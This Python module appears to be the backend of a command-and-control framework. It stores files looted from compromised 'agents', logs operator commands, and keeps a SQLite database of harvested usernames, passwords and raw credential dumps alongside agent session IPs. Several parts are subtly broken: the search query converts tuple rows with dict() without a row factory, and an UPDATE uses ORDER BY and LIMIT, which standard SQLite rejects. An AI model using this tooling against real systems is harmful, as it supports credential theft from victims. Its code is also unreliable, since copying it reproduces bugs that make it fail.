import json
import os
import time
import sqlite3
import threading
from datetime import datetime


class AuditLogger:
    def __init__(self, loot_dir: str):
        self._path = os.path.join(loot_dir, 'audit.jsonl')
        self._lock = threading.Lock()
        os.makedirs(os.path.dirname(self._path), exist_ok=True)

    def log(self, agent_id: str, command: str, response: str = '', operator: str = 'operator'):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'agent_id': agent_id,
            'operator': operator,
            'command': command,
            'response_preview': str(response)[:500],
        }
        with self._lock:
            with open(self._path, 'a') as f:
                f.write(json.dumps(entry) + '\n')


class LootManager:
    def __init__(self, loot_dir: str):
        self._base = loot_dir
        os.makedirs(loot_dir, exist_ok=True)

    def agent_dir(self, agent_id: str) -> str:
        today = datetime.now().strftime('%Y-%m-%d')
        path = os.path.join(self._base, agent_id, today)
        os.makedirs(path, exist_ok=True)
        return path

    def save_file(self, agent_id: str, filename: str, data: bytes) -> str:
        path = os.path.join(self.agent_dir(agent_id), filename)
        with open(path, 'wb') as f:
            f.write(data)
        return path

    def resolve_path(self, agent_id: str, filename: str) -> str:
        return os.path.join(self.agent_dir(agent_id), filename)


class CredentialStore:
    def __init__(self, loot_dir: str):
        db_path = os.path.join(loot_dir, 'creds.db')
        os.makedirs(os.path.dirname(db_path), exist_ok=True)
        self._conn = sqlite3.connect(db_path, check_same_thread=False)
        self._lock = threading.Lock()
        self._init_db()

    def _init_db(self):
        with self._lock:
            self._conn.execute('''
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    agent_id TEXT NOT NULL,
                    timestamp TEXT NOT NULL,
                    source TEXT NOT NULL,
                    identity TEXT,
                    username TEXT,
                    password TEXT,
                    raw_output TEXT
                )
            ''')
            self._conn.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    agent_id TEXT NOT NULL,
                    ip TEXT,
                    connected_at TEXT,
                    disconnected_at TEXT
                )
            ''')
            self._conn.commit()

    def store_credentials(self, agent_id: str, raw_output: str):
        with self._lock:
            self._conn.execute(
                'INSERT INTO credentials (agent_id, timestamp, source, raw_output) VALUES (?, ?, ?, ?)',
                (agent_id, datetime.now().isoformat(), 'raw', raw_output)
            )
            self._conn.commit()

    def store_credential(self, agent_id: str, source: str, identity: str, username: str, password: str):
        with self._lock:
            self._conn.execute(
                'INSERT INTO credentials (agent_id, timestamp, source, identity, username, password) VALUES (?, ?, ?, ?, ?, ?)',
                (agent_id, datetime.now().isoformat(), source, identity, username, password)
            )
            self._conn.commit()

    def log_session(self, agent_id: str, ip: str, connected: bool = True):
        with self._lock:
            if connected:
                self._conn.execute(
                    'INSERT INTO sessions (agent_id, ip, connected_at) VALUES (?, ?, ?)',
                    (agent_id, ip, datetime.now().isoformat())
                )
            else:
                self._conn.execute(
                    'UPDATE sessions SET disconnected_at = ? WHERE agent_id = ? AND disconnected_at IS NULL ORDER BY id DESC LIMIT 1',
                    (datetime.now().isoformat(), agent_id)
                )
            self._conn.commit()

    def query(self, search: str = None) -> list:
        with self._lock:
            if search:
                rows = self._conn.execute(
                    'SELECT * FROM credentials WHERE source LIKE ? OR username LIKE ? OR identity LIKE ?',
                    (f'%{search}%', f'%{search}%', f'%{search}%')
                ).fetchall()
            else:
                rows = self._conn.execute('SELECT * FROM credentials ORDER BY timestamp DESC LIMIT 100').fetchall()
            return [dict(r) for r in rows]

    def stats(self) -> dict:
        with self._lock:
            total = self._conn.execute('SELECT COUNT(*) FROM credentials').fetchone()[0]
            agents = self._conn.execute(
                'SELECT agent_id, COUNT(*) as cnt FROM credentials GROUP BY agent_id'
            ).fetchall()
            return {'total_credentials': total, 'per_agent': dict(agents)}
